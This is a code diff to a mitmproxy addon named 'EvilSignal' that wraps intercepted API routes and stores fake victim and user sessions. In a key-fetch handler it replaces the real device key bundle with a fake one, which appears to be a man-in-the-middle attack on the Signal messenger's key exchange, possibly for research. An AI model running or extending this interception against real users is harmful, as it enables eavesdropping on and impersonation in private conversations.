@@ -1,3 +1,4 @@
+from mitmproxy.addonmanager import Loader
 from mitmproxy.http import HTTPFlow, Request, Response, Headers
 # from mitmproxy import ctx
 from dataclasses import dataclass
@@ -119,12 +120,59 @@ f.close()
 
 api = addons[0]
 
-ctx.options.add_option(
-    name="conversation_session",
-    typespec=dict,
-    default=dict(),
-    help="chat sessions",
-)
+class EvilSignal(InterceptedAPI):
+    wrapped_api = None
+
+    def __init__(self, wrapped_api: InterceptedAPI):
+        self.wrapped_api = wrapped_api
+        super().__init__(
+            default_host = wrapped_api.default_host,
+            host_mapping = wrapped_api.host_mapping,
+            blacklist_domain = wrapped_api.blacklist_domain,
+            request_passthrough = wrapped_api.request_passthrough,
+            response_passthrough = wrapped_api.response_passthrough,
+            respect_proxy_headers = wrapped_api.respect_proxy_headers,
+        )
+        if self.wrapped_api is not None:
+            for route in self.wrapped_api.request_routes.routes:
+                host, path, method, handler, allowed_statuses = route
+                self.request_routes.add_route(host, path, method, handler, allowed_statuses)
+            for route in self.wrapped_api.response_routes.routes:
+                host, path, method, handler, allowed_statuses = route
+                self.response_routes.add_route(host, path, method, handler, allowed_statuses)
+            for route in self.wrapped_api.ws_request_routes.routes:
+                host, path, mtype, handler = route
+                self.ws_request_routes.add_route(host, path, mtype, handler)
+            for route in self.wrapped_api.ws_response_routes.routes:
+                host, path, mtype, handler = route
+                self.ws_response_routes.add_route(host, path, mtype, handler)
+
+
+    def load(self, loader: Loader):
+        loader.add_option(
+            name="conversation_session",
+            typespec=dict,
+            default=dict(),
+            help="chat sessions",
+        )
+        # a bit hacky
+        # if self.wrapped_api is not None:
+        #     for route in self.wrapped_api.request_routes.routes:
+        #         host, path, method, handler, allowed_statuses = route
+        #         self.request_routes.add_route(host, path, method, handler, allowed_statuses)
+        #     for route in self.wrapped_api.response_routes.routes:
+        #         host, path, method, handler, allowed_statuses = route
+        #         self.response_routes.add_route(host, path, method, handler, allowed_statuses)
+        #     for route in self.wrapped_api.ws_request_routes.routes:
+        #         host, path, mtype, handler = route
+        #         self.ws_request_routes.add_route(host, path, mtype, handler)
+        #     for route in self.wrapped_api.ws_response_routes.routes:
+        #         host, path, mtype, handler = route
+        #         self.ws_response_routes.add_route(host, path, mtype, handler)
+
+        super().load(loader) # pass remaining to
+
+api = EvilSignal(api)
 
 def json_to_reginfo(json_registations: str) -> dict[str, RegistrationInfo]:
     loaded_dict = json.loads(json_registations)
@@ -500,7 +548,8 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     resp.update(fakeBundle_wire)
 
-    ctx.options.conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
+    # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
+    ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
     logging.warning(f"session {ctx.options.conversation_session}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
